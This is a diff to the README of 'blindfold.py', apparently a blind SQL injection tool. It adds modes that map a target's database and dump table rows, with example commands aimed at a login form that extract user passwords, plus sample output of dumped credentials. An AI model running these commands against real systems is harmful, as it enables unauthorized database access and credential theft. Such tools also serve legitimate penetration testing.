@@ -77,10 +77,32 @@ python3 blindfold.py --help
 
 ---
 
+## Modes
+
+blindfold has one default and two explicit actions — you usually only need the default:
+
+| You run… | It does |
+|----------|---------|
+| *(nothing)* | **Map mode (default)** — detect, then print **DBMS · current database · table list**. Quiet (no columns/rows). |
+| `--dump TABLE` | Auto-discovers the table's columns and dumps its rows (capped by `--max-rows`, default 50). |
+| `--query "<SQL scalar>"` | Power mode — extract one specific value. |
+
+```bash
+# map the database (the everyday command)
+blindfold.py -u http://t:3000/login -d "username=INJECT&password=test"
+
+# dump a table
+blindfold.py -u http://t:3000/login -d "username=INJECT&password=test" --dump users
+
+# extract one scalar
+blindfold.py -u http://t:3000/login -d "username=INJECT&password=test" \
+  --query "SELECT password FROM users WHERE username='antwon'"
+```
+
 ## Usage
 
 ```
-python3 blindfold.py --query "<SQL scalar>" [target] [detection] [tuning]
+python3 blindfold.py [target] [action] [detection] [tuning]
 ```
 
 ### Target (choose one style)
@@ -94,11 +116,19 @@ python3 blindfold.py --query "<SQL scalar>" [target] [detection] [tuning]
 | `--request`    | Raw HTTP request file containing the marker |
 | `--proto`      | Scheme for `--request` files (default `http`) |
 
+### Action (default: map the database)
+
+| Flag | Meaning |
+|------|---------|
+| *(none)*      | Map mode — DBMS, current database, and table names |
+| `--dump TABLE`| Dump rows of a table (columns auto-discovered) |
+| `--max-rows`  | Row cap for `--dump` (default `50`) |
+| `--query`     | Extract a single SQL scalar (power mode) |
+
 ### Injection
 
 | Flag | Meaning |
 |------|---------|
-| `--query`     | **(required)** SQL scalar to extract, e.g. `"SELECT password FROM users WHERE username='bob'"` |
 | `--marker`    | Placeholder for the injection point (default `INJECT`) |
 | `--no-encode` | Do **not** URL-encode the payload |
 
@@ -219,6 +249,34 @@ When nothing reflects and boolean has no signal, it falls back to time:
 [+] DBMS      : postgresql
 [+] TECHNIQUE : time-based
 [+] CONTEXT   : stacked
+```
+
+Default **map mode** output (no `--query`):
+
+```
+=== DATABASE MAP ===
+DBMS     : postgresql
+Database : shopdb
+Tables   : 3
+  - users
+  - products
+  - orders
+
+[i] dump a table with:  --dump <table>   (rows capped by --max-rows)
+```
+
+And `--dump users`:
+
+```
+=== DUMP: users ===
+columns (3): id, username, password
+rows: 3
+
+id | username | password
+---+----------+---------
+1  | admin    | s3cr3t
+2  | bob      | hunter2
+3  | eve      | p@ss
 ```
 
 ---
